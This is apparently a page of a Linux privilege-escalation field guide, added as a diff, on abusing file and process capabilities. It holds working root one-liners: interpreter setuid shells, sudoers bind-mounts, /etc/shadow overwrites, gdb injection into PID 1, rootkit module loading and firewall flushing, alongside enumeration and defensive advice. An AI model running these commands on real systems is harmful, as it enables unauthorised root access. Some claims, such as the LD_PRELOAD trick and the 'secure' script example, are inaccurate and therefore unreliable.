@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <meta name="theme-color" content="#050505">
+  <meta name="description" content="Privilege Escalation part 3 of 10. Map capability sets, dangerous grants and inheritance paths on files and processes.">
+  <title>Part 03: Linux Capabilities | 0XMAP Privilege Escalation</title>
+  <link rel="icon" href="../static/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="../static/guide.css">
+</head>
+<body data-root="../">
+  <a class="g-skip" href="#main">Skip to content</a>
+  
+<header class="g-top">
+  <div class="g-top-inner">
+    <a class="g-brand" href="../index.html" aria-label="0XMAP Linux field guide home">
+      <span class="g-mark" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 7l4 5-4 5"/><path d="M12 17h8"/></svg></span>
+      <span class="g-brand-text">
+        <span class="g-name">0XMAP</span>
+        <span class="g-sub">Linux field guide</span>
+      </span>
+    </a>
+    <div class="g-top-actions">
+      <nav class="g-top-nav" aria-label="Guide">
+        <a href="../index.html#about">Guide</a>
+        <a href="../index.html#foundations">Foundations</a>
+        <a href="../index.html#privesc">Privilege escalation</a>
+        <a href="../index.html#chapters">Chapters</a>
+      </nav>
+      <button type="button" class="g-search-btn" data-search-open aria-label="Search the guide">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="6.5"/><path d="m16 16 4 4"/></svg>
+        <span>Search</span>
+        <kbd>/</kbd>
+      </button>
+      <span class="g-context-pill">Privilege escalation</span>
+      <button type="button" class="g-menu-btn" data-menu-toggle aria-label="Open chapter menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
+    </div>
+  </div>
+</header>
+  
+<div class="g-doc-layout">
+  
+<aside class="g-sidebar" data-sidebar aria-label="Privilege escalation navigation">
+  <div class="g-sidebar-head">
+    <div>
+      <p class="g-sidebar-kicker">Privilege Escalation</p>
+      <p class="g-sidebar-count">10 parts / practitioner path</p>
+    </div>
+    <button type="button" class="g-side-close" data-menu-close aria-label="Close handbook menu">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 6l12 12M18 6 6 18"/></svg>
+    </button>
+  </div>
+  <nav class="g-side-nav">
+    <section class="g-nav-part">
+      <div class="g-nav-part-head"><span class="g-nav-part-num">PE</span><span>Handbook</span></div>
+      <ol><li><a class="g-nav-link g-nav-link-simple" href="../privesc/01-sudo-misconfigurations.html"><span class="g-nav-num">01</span><span class="g-nav-title">Sudo</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/02-suid-sgid-binaries.html"><span class="g-nav-num">02</span><span class="g-nav-title">SUID and SGID</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/03-linux-capabilities.html" aria-current="page"><span class="g-nav-num">03</span><span class="g-nav-title">Capabilities</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/04-cron-jobs.html"><span class="g-nav-num">04</span><span class="g-nav-title">Cron jobs</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/05-writable-system-files.html"><span class="g-nav-num">05</span><span class="g-nav-title">Writable files</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/06-path-hijacking.html"><span class="g-nav-num">06</span><span class="g-nav-title">PATH hijacking</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/07-environment-variable-abuse.html"><span class="g-nav-num">07</span><span class="g-nav-title">Environment</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/08-kernel-exploits.html"><span class="g-nav-num">08</span><span class="g-nav-title">Kernel</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/09-service-misconfigurations.html"><span class="g-nav-num">09</span><span class="g-nav-title">Services</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/10-nfs-misconfigurations.html"><span class="g-nav-num">10</span><span class="g-nav-title">NFS</span></a></li></ol>
+    </section>
+  </nav>
+  <a class="g-side-guide" href="../chapters/26-automating-linux-privilege-escalation-checks.html">
+    <span class="g-side-guide-kicker">Apply it</span>
+    <strong>Chapter 26 / automation</strong>
+    <span>Turn the checks into a repeatable enumeration pass</span>
+  </a>
+  <a class="g-side-guide" href="../index.html#foundations">
+    <span class="g-side-guide-kicker">Companion handbook</span>
+    <strong>Linux Foundations</strong>
+    <span>10 parts from first command to secure baseline</span>
+  </a>
+  <p class="g-sidebar-note">Use these techniques only in labs, CTFs or systems you own and have written permission to test.</p>
+</aside>
+<div class="g-scrim" data-menu-close hidden></div>
+  <main class="g-content" id="main">
+    <article class="g-article">
+      <header class="g-chapter-head">
+        <nav class="g-chapter-crumb" aria-label="Breadcrumb">
+          <a href="../index.html">Field guide</a><span>/</span>
+          <a href="../index.html#privesc">Privilege Escalation</a><span>/</span>
+          <span>Part 03</span>
+        </nav>
+        <p class="g-kicker">Privilege Escalation / Part 03</p>
+        <h1>Linux Capabilities</h1>
+        <p class="g-deck">Map capability sets, dangerous grants and inheritance paths on files and processes.</p>
+        <div class="g-chapter-meta">
+          <span>9 min read</span>
+          <span>10 sections</span>
+          <span>21 code blocks</span>
+          <span>Part 03 / 10</span>
+        </div>
+      </header>
+      
+<details class="g-toc-mobile">
+  <summary>On this page <span>10 sections</span></summary>
+  <nav aria-label="On this page"><a class="g-toc-link depth-2" href="#linux-capabilities-for-privilege-escalation" data-toc-link>Linux Capabilities for Privilege Escalation</a><a class="g-toc-link depth-3" href="#1-understanding-linux-capabilities" data-toc-link>1. Understanding Linux Capabilities</a><a class="g-toc-link depth-3" href="#2-enumeration-finding-capabilities" data-toc-link>2. Enumeration: Finding Capabilities</a><a class="g-toc-link depth-3" href="#3-dangerous-capabilities-and-exploitation" data-toc-link>3. Dangerous Capabilities &amp; Exploitation</a><a class="g-toc-link depth-3" href="#4-capability-inheritance-exploitation" data-toc-link>4. Capability Inheritance Exploitation</a><a class="g-toc-link depth-3" href="#5-file-vs-running-process-capabilities" data-toc-link>5. File vs. Running Process Capabilities</a><a class="g-toc-link depth-3" href="#6-other-dangerous-capabilities" data-toc-link>6. Other Dangerous Capabilities</a><a class="g-toc-link depth-3" href="#7-practical-exploitation-workflow" data-toc-link>7. Practical Exploitation Workflow</a><a class="g-toc-link depth-3" href="#8-automated-tools" data-toc-link>8. Automated Tools</a><a class="g-toc-link depth-3" href="#9-defensive-measures" data-toc-link>9. Defensive Measures</a></nav>
+</details>
+      <div class="g-prose"><h2 id="linux-capabilities-for-privilege-escalation">Linux Capabilities for Privilege Escalation<a aria-label="Link to this section" class="g-anchor" href="#linux-capabilities-for-privilege-escalation">#</a></h2>
+<p>Linux capabilities are a <strong>fine-grained privilege model</strong> that replaces the all-or-nothing approach of SUID root. Instead of giving a binary full root privileges, specific capabilities are assigned. This is a more secure alternative to SUID, but <strong>misconfigured capabilities</strong> can be just as dangerous.</p>
+<hr/>
+<h3 id="1-understanding-linux-capabilities">1. Understanding Linux Capabilities<a aria-label="Link to this section" class="g-anchor" href="#1-understanding-linux-capabilities">#</a></h3>
+<p>Capabilities divide root privileges into ~40 distinct units. A binary with capabilities runs with <strong>only those privileges</strong>, not full root.</p>
+<p><strong>Key Concept</strong>: Capabilities can be assigned to:</p>
+<ul>
+<li><strong>Files</strong> (executable binaries) - persist across executions</li>
+<li><strong>Processes</strong> (running programs) - inherited at runtime</li>
+<li><strong>Threads</strong> - per-thread privilege control</li>
+</ul>
+<p><strong>Capability Sets</strong>:</p>
+<ul>
+<li><strong>Effective (E)</strong>: Currently active capabilities</li>
+<li><strong>Permitted (P)</strong>: Capabilities that can be used</li>
+<li><strong>Inheritable (I)</strong>: Capabilities passed to child processes</li>
+<li><strong>Bounding (B)</strong>: Maximum capabilities a process can gain</li>
+</ul>
+<hr/>
+<h3 id="2-enumeration-finding-capabilities">2. Enumeration: Finding Capabilities<a aria-label="Link to this section" class="g-anchor" href="#2-enumeration-finding-capabilities">#</a></h3>
+<p><strong>List all files with capabilities</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># More targeted search</span>
+getcap<span class="w"> </span>-r<span class="w"> </span>/usr/bin<span class="w"> </span>/usr/sbin<span class="w"> </span>/bin<span class="w"> </span>/sbin<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Check specific binary</span>
+getcap<span class="w"> </span>/usr/bin/python3
+</code></pre></div>
+<p><strong>View process capabilities</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check current process</span>
+capsh<span class="w"> </span>--print
+
+<span class="c1"># Check running process by PID</span>
+cat<span class="w"> </span>/proc/&lt;PID&gt;/status<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>Cap
+<span class="c1"># Convert to human-readable</span>
+capsh<span class="w"> </span>--decode<span class="o">=</span>0x0000000000000000
+</code></pre></div>
+<hr/>
+<h3 id="3-dangerous-capabilities-and-exploitation">3. Dangerous Capabilities &amp; Exploitation<a aria-label="Link to this section" class="g-anchor" href="#3-dangerous-capabilities-and-exploitation">#</a></h3>
+<h4 id="a-cap-setuid-cap-setgid">A. CAP_SETUID + CAP_SETGID<a aria-label="Link to this section" class="g-anchor" href="#a-cap-setuid-cap-setgid">#</a></h4>
+<p>Allows changing the UID/GID of the process. Combined with binaries that can spawn shells, this grants full root.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Python with CAP_SETUID</span>
+python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">'import os; os.setuid(0); os.system("/bin/bash")'</span>
+
+<span class="c1"># Perl with capabilities</span>
+perl<span class="w"> </span>-e<span class="w"> </span><span class="s1">'use POSIX; POSIX::setuid(0); exec "/bin/bash";'</span>
+
+<span class="c1"># Ruby</span>
+ruby<span class="w"> </span>-e<span class="w"> </span><span class="s1">'Process::Sys.setuid(0); exec "/bin/bash"'</span>
+</code></pre></div>
+<p><strong>Check for interpreters</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">"python|perl|ruby|php|node"</span>
+</code></pre></div>
+<hr/>
+<h4 id="b-cap-sys-admin">B. CAP_SYS_ADMIN<a aria-label="Link to this section" class="g-anchor" href="#b-cap-sys-admin">#</a></h4>
+<p>Mount filesystems, manipulate kernel modules, and access raw block devices. Often leads to root.</p>
+<p><strong>Exploitation Methods</strong>:</p>
+<p><strong>1. Mounting /etc</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Create a fake /etc with malicious sudoers</span>
+mkdir<span class="w"> </span>/tmp/fake_etc
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'user ALL=(ALL) NOPASSWD:ALL'</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/fake_etc/sudoers
+mount<span class="w"> </span>--bind<span class="w"> </span>/tmp/fake_etc<span class="w"> </span>/etc
+sudo<span class="w"> </span>bash
+</code></pre></div>
+<p><strong>2. Mounting /dev/loop for arbitrary file writes</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Create overlay filesystem to hide malicious files</span>
+mount<span class="w"> </span>-t<span class="w"> </span>overlay<span class="w"> </span>overlay<span class="w"> </span>-o<span class="w"> </span><span class="nv">lowerdir</span><span class="o">=</span>/etc,upperdir<span class="o">=</span>/tmp/overlay,workdir<span class="o">=</span>/tmp/work<span class="w"> </span>/etc
+</code></pre></div>
+<p><strong>3. Kernel module loading</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Load malicious kernel module</span>
+insmod<span class="w"> </span>/tmp/rootkit.ko
+</code></pre></div>
+<hr/>
+<h4 id="c-cap-dac-override-cap-dac-read-search">C. CAP_DAC_OVERRIDE + CAP_DAC_READ_SEARCH<a aria-label="Link to this section" class="g-anchor" href="#c-cap-dac-override-cap-dac-read-search">#</a></h4>
+<p>Bypass file read/write/execute permissions. Can read any file on the system.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Read /etc/shadow (even with 000 permissions)</span>
+cat<span class="w"> </span>/etc/shadow
+
+<span class="c1"># Write to restricted files</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'user:newpassword'</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/shadow
+
+<span class="c1"># Execute files without execute permissions</span>
+sh<span class="w"> </span>/tmp/script.sh<span class="w">  </span><span class="c1"># bypasses execute bit</span>
+</code></pre></div>
+<hr/>
+<h4 id="d-cap-sys-ptrace">D. CAP_SYS_PTRACE<a aria-label="Link to this section" class="g-anchor" href="#d-cap-sys-ptrace">#</a></h4>
+<p>Allows attaching to any process with <code>ptrace()</code>. This can inject code into root processes.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Attach to root process and inject shellcode</span>
+gdb<span class="w"> </span>-p<span class="w"> </span>&lt;root_pid&gt;
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>call<span class="w"> </span>system<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span>
+</code></pre></div>
+<p><strong>Danger</strong>: This effectively allows reading memory from any process, including:</p>
+<ul>
+<li>SSH sessions (capture passwords)</li>
+<li>Running processes (dump sensitive data)</li>
+<li>Keylogging at system level</li>
+</ul>
+<hr/>
+<h4 id="e-cap-sys-module">E. CAP_SYS_MODULE<a aria-label="Link to this section" class="g-anchor" href="#e-cap-sys-module">#</a></h4>
+<p>Load and unload kernel modules. This is <strong>game over</strong> for system security.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check if binary with CAP_SYS_MODULE exists</span>
+getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>sys_module
+
+<span class="c1"># If Python has this:</span>
+python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">'import os; os.system("insmod /tmp/rootkit.ko")'</span>
+</code></pre></div>
+<hr/>
+<h4 id="f-cap-net-admin-cap-net-raw">F. CAP_NET_ADMIN + CAP_NET_RAW<a aria-label="Link to this section" class="g-anchor" href="#f-cap-net-admin-cap-net-raw">#</a></h4>
+<p>Network manipulation including:</p>
+<ul>
+<li>Packet sniffing/sniffing</li>
+<li>ARP poisoning</li>
+<li>Firewall bypass</li>
+</ul>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Sniff network traffic (requires Python with NET_RAW)</span>
+python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">'import socket; s=socket.socket(socket.AF_PACKET, socket.SOCK_RAW); print(s.recv(1024))'</span>
+
+<span class="c1"># Modify iptables</span>
+iptables<span class="w"> </span>-F
+iptables<span class="w"> </span>-A<span class="w"> </span>INPUT<span class="w"> </span>-j<span class="w"> </span>ACCEPT<span class="w">  </span><span class="c1"># Open firewall</span>
+</code></pre></div>
+<hr/>
+<h3 id="4-capability-inheritance-exploitation">4. Capability Inheritance Exploitation<a aria-label="Link to this section" class="g-anchor" href="#4-capability-inheritance-exploitation">#</a></h3>
+<p>When a process has capabilities, it can pass them to child processes. This creates attack chains.</p>
+<p><strong>Scenario</strong>: A binary has <code>cap_setuid+ep</code> but doesn't spawn a shell directly. However, it might call external commands.</p>
+<p><strong>Exploitation via Environment</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Create malicious library</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'void __attribute__((constructor)) init() { setuid(0); system("/bin/sh"); }'</span><span class="w"> </span>&gt;<span class="w"> </span>exploit.c
+gcc<span class="w"> </span>-shared<span class="w"> </span>-fPIC<span class="w"> </span>exploit.c<span class="w"> </span>-o<span class="w"> </span>exploit.so
+
+<span class="c1"># If binary honors LD_PRELOAD (uncommon for SUID, but possible with caps)</span>
+<span class="nv">LD_PRELOAD</span><span class="o">=</span>./exploit.so<span class="w"> </span>/path/to/capability/binary
+</code></pre></div>
+<hr/>
+<h3 id="5-file-vs-running-process-capabilities">5. File vs. Running Process Capabilities<a aria-label="Link to this section" class="g-anchor" href="#5-file-vs-running-process-capabilities">#</a></h3>
+<p><strong>File-based (persistent)</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Grant capability to a file</span>
+setcap<span class="w"> </span>cap_net_admin+ep<span class="w"> </span>/usr/bin/python3
+
+<span class="c1"># Remove capability</span>
+setcap<span class="w"> </span>-r<span class="w"> </span>/usr/bin/python3
+</code></pre></div>
+<p><strong>Process-based (runtime)</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Run process with specific capabilities</span>
+capsh<span class="w"> </span>--caps<span class="o">=</span><span class="s2">"cap_net_admin+ep"</span><span class="w"> </span>--<span class="w"> </span>-c<span class="w"> </span><span class="s2">"/usr/bin/python3"</span>
+</code></pre></div>
+<p><strong>Note</strong>: File capabilities are <strong>persistent across reboots</strong> and affect all users.</p>
+<hr/>
+<h3 id="6-other-dangerous-capabilities">6. Other Dangerous Capabilities<a aria-label="Link to this section" class="g-anchor" href="#6-other-dangerous-capabilities">#</a></h3>
+<div class="g-table-wrap"><table class="g-table">
+<thead>
+<tr>
+<th>Capability</th>
+<th>Description</th>
+<th>Exploit</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>CAP_SYS_CHROOT</code></td>
+<td><code>chroot()</code> system call</td>
+<td>Escape chroot via <code>chroot(".")</code> + pivot_root</td>
+</tr>
+<tr>
+<td><code>CAP_SYS_BOOT</code></td>
+<td>Reboot system</td>
+<td><code>reboot()</code></td>
+</tr>
+<tr>
+<td><code>CAP_SYS_TIME</code></td>
+<td>Change system clock</td>
+<td>Manipulate timestamps for forensics evasion</td>
+</tr>
+<tr>
+<td><code>CAP_SYS_NICE</code></td>
+<td>Change process priorities</td>
+<td>Denial of service</td>
+</tr>
+<tr>
+<td><code>CAP_SYS_RESOURCE</code></td>
+<td>Resource limits</td>
+<td>Set unlimited resources, DoS</td>
+</tr>
+<tr>
+<td><code>CAP_FOWNER</code></td>
+<td>Bypass file ownership checks</td>
+<td>Read/write any file</td>
+</tr>
+<tr>
+<td><code>CAP_MAC_ADMIN</code></td>
+<td>Override SELinux/AppArmor</td>
+<td>Disable MAC systems</td>
+</tr>
+<tr>
+<td><code>CAP_AUDIT_CONTROL</code></td>
+<td>Control audit subsystem</td>
+<td>Hide malicious activities</td>
+</tr>
+</tbody>
+</table></div>
+<hr/>
+<h3 id="7-practical-exploitation-workflow">7. Practical Exploitation Workflow<a aria-label="Link to this section" class="g-anchor" href="#7-practical-exploitation-workflow">#</a></h3>
+<p><strong>Step 1: Enumerate</strong></p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>capabilities.txt
+</code></pre></div>
+<p><strong>Step 2: Identify dangerous binaries</strong></p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Look for common interpreters with caps</span>
+cat<span class="w"> </span>capabilities.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">"python|perl|ruby|php|node|sh|bash"</span>
+
+<span class="c1"># Focus on specific dangerous capabilities</span>
+cat<span class="w"> </span>capabilities.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">"cap_setuid|cap_sys_admin|cap_dac_override|cap_sys_module"</span>
+</code></pre></div>
+<p><strong>Step 3: Exploit using GTFOBins or custom methods</strong></p>
+<p><strong>Example - Python with CAP_SETUID</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check exact capabilities</span>
+getcap<span class="w"> </span>/usr/bin/python3.11
+<span class="c1"># Output: /usr/bin/python3.11 = cap_setuid+ep</span>
+
+<span class="c1"># Exploit</span>
+/usr/bin/python3.11<span class="w"> </span>-c<span class="w"> </span><span class="s1">'import os; os.setuid(0); os.system("/bin/bash")'</span>
+</code></pre></div>
+<p><strong>Example - tar with CAP_DAC_OVERRIDE</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># tar can read any file despite permissions</span>
+tar<span class="w"> </span>-czf<span class="w"> </span>/tmp/out.tar.gz<span class="w"> </span>/etc/shadow<span class="w">  </span><span class="c1"># Works even if shadow is 000</span>
+</code></pre></div>
+<p><strong>Example - gdb with CAP_SYS_PTRACE</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Attach to PID 1 (init/systemd) and escalate</span>
+gdb<span class="w"> </span>-p<span class="w"> </span><span class="m">1</span>
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>call<span class="w"> </span>system<span class="o">(</span><span class="s2">"exec /bin/bash 1&gt;&amp;0 2&gt;&amp;0"</span><span class="o">)</span>
+</code></pre></div>
+<hr/>
+<h3 id="8-automated-tools">8. Automated Tools<a aria-label="Link to this section" class="g-anchor" href="#8-automated-tools">#</a></h3>
+<p><strong>Capability-specific checks</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># LinPEAS will check capabilities</span>
+./linpeas.sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>capabilities
+
+<span class="c1"># Manual enumeration script</span>
+<span class="k">for</span><span class="w"> </span>file<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-executable<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="nv">caps</span><span class="o">=</span><span class="k">$(</span>getcap<span class="w"> </span><span class="nv">$file</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="k">)</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>!<span class="w"> </span>-z<span class="w"> </span><span class="s2">"</span><span class="nv">$caps</span><span class="s2">"</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"</span><span class="nv">$caps</span><span class="s2">"</span>
+<span class="w">    </span><span class="k">fi</span>
+<span class="k">done</span>
+</code></pre></div>
+<hr/>
+<h3 id="9-defensive-measures">9. Defensive Measures<a aria-label="Link to this section" class="g-anchor" href="#9-defensive-measures">#</a></h3>
+<p><strong>For Administrators</strong>:</p>
+<ul>
+<li><strong>Minimize capabilities</strong>: Only grant necessary capabilities</li>
+<li><strong>Avoid interpreters</strong>: Never give capabilities to Python/Perl/Ruby interpreters</li>
+<li><strong>Use <code>noexec</code> mounts</strong>: Prevents execution on sensitive partitions</li>
+<li><strong>Monitor capabilities</strong>: Audit with <code>getcap -r /</code> regularly</li>
+<li><strong>SELinux/AppArmor</strong>: Restrict capability usage further</li>
+<li><strong>Remove capabilities</strong>: <code>setcap -r /path/to/binary</code></li>
+</ul>
+<p><strong>Secure example</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Instead of giving Python CAP_SETUID</span>
+<span class="c1"># Grant only to specific script with limited capabilities</span>
+setcap<span class="w"> </span>cap_setuid+ep<span class="w"> </span>/usr/local/bin/safe_script.py
+<span class="c1"># And ensure script is not writable by regular users</span>
+chmod<span class="w"> </span><span class="m">755</span><span class="w"> </span>/usr/local/bin/safe_script.py
+chown<span class="w"> </span>root:root<span class="w"> </span>/usr/local/bin/safe_script.py
+</code></pre></div>
+</div>
+      <p class="g-source-note">Privilege Escalation handbook: Part 03 of 10. Adapted from <a href="https://github.com/JoramMalley/Linux-privilege-escalation" target="_blank" rel="noopener noreferrer">JoramMalley's Linux privilege escalation notes</a> and corrected where public advisories differ. Verify every version, CVE and command against vendor documentation. Use only in labs, CTFs or systems you own and have written permission to test.</p>
+      <div class="g-foundation-cta">
+        <div>
+          <p class="g-kicker">Apply it</p>
+          <strong>Automate the enumeration.</strong>
+          <p>Chapter 26 turns these checks into a repeatable collection and validation pass.</p>
+        </div>
+        <a class="g-btn primary" href="../chapters/26-automating-linux-privilege-escalation-checks.html">
+          Open Chapter 26 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14"/><path d="m13 6 6 6-6 6"/></svg>
+        </a>
+      </div>
+      <nav class="g-chapter-nav" aria-label="Privilege escalation navigation"><a class="g-chapter-card" href="../privesc/02-suid-sgid-binaries.html" data-prev-privesc><span class="g-chapter-card-label">Previous / Part 02</span><strong>SUID and SGID Binaries</strong></a><a class="g-chapter-card" href="../privesc/04-cron-jobs.html" data-next-privesc><span class="g-chapter-card-label">Next / Part 04</span><strong>Cron Jobs</strong></a></nav>
+    </article>
+  </main>
+  
+<aside class="g-toc" aria-label="On this page">
+  <div class="g-toc-inner">
+    <p class="g-toc-kicker">On this page</p>
